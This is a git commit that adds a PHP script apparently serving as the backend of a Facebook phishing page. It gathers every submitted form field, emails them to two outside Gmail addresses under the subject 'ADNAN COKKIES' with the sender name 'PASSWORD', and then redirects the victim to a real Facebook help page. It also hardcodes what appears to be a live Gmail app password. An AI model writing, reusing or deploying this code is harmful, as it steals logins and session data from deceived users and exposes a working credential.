14c85ffef7fa332709a3b1b34b9a31b386f6c1fd
gorillabrown001 <149425118+gorillabrown001@users.noreply.github.com>
2024-07-26 23:12:16 +0500

    adnan.php

---
+++ adnan.php
@@ -0,0 +1,61 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+header("Location: https://web.facebook.com/help/196050490547892?_rdc=1&_rdr");
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
+
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+
+    // PHPMailer object creation
+    $mail = new PHPMailer(true);
+    try {
+        // SMTP settings
+        $mail->isSMTP();
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'viralvedyxd@gmail.com'; // Replace with your email address
+        $mail->Password   = 'ywdo vtoq xzka jyka'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('viralvedyxd@gmail.com', 'PASSWORD');
+        $mail->addAddress('contactclarisasmith@gmail.com');
+       $mail->addAddress('requiredverifi@gmail.com');
+
+
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'ADNAN COKKIES';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+
+
+
+        
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
+}
+?>
